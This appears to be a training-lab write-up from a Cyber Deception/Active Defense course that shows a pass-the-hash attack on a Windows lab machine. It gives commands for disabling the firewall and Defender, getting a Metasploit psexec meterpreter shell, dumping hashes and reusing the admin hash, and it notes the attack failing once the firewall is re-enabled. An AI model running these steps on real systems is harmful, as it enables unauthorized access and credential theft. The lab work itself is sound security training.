# Pass the Hash
(Antisyphon training lab from Cyber Deception/Active Defense)
## Firewall/NMAP
- In cmd, turn the Windows firewall on and off using these commands: <br>
<pre>netsh advfirewall set allprofiles state on</pre> 
<pre>netsh advfirewall set allprofiles state off</pre>
- In Kali Linux become root by using <br>
<pre>sudo su -</pre>
- I ran nmap with both the firewall off and on: <br>
<pre>nmap {IP ADDRESS OF WINDOWS MACHINE}</pre><br>
off: <br>
<img width="800" alt="Picture1" src="https://github.com/user-attachments/assets/844461e5-15f1-4b90-a880-9c43e84ac0c9" /><br>
on:<br>
<img width="800" alt="Picture2" src="https://github.com/user-attachments/assets/aab2fbbd-7c73-4499-933f-1797bf2bb85d" /><br>
## Pass the Hash
* First disable Windows Defender with this command in PowerShell <br>
<pre>Set-MpPreference -DisableRealtimeMonitoring $true </pre><br>
* Ensure the firewall is set to off
* Set the admin password: <br>
<pre>net user Administrator password1234</pre> <br>
* As root, start metasploit <br>
<pre>msfconsole -q</pre> <br>
* Start a meterpreter shell by setting the exploit, remote host, listen host, username, and password <br>
<pre>use exploit/windows/smb/psexec</pre> 
<pre>set RHOST {IP OF WINDOWS MACHINE}</pre> 
<pre>set LHOST {IP OF LINUX MACHINE}</pre> 
<pre>set SMBUSER Administrator</pre> 
<pre>set SMBPASS password1234</pre> 
<pre>exploit</pre> <br><br>
<img width="1000" alt="Picture3" src="https://github.com/user-attachments/assets/960a1685-b48e-4c3d-bfd7-b1ed378fadc0" /> <br><br>
* Next, dump password hashes with <br>
<pre>hashdump</pre> <br><br>
  <img width="1000" alt="Picture4" src="https://github.com/user-attachments/assets/cbbc093d-1f9d-4cf4-ae91-0c6ed3305161" /> <br><br>
* Exit the meterpreter shell with <br>
<pre>exit -y</pre> <br>
* Grab the hash of the admin account and run the following command: <br>
<pre>set SMBPASS {HASH OF ADMIN}</pre> <br><br>
<img width="1100" alt="Picture5" src="https://github.com/user-attachments/assets/0d7c13bf-abf7-413c-8045-2c8924e32784" /><br><br>
* After turning the firewall on again, the attack failed: <br><br>
<img width="1000" alt="Picture6" src="https://github.com/user-attachments/assets/8eea3ba8-32f8-43d3-9f1c-a45c50ad8378" /><br>







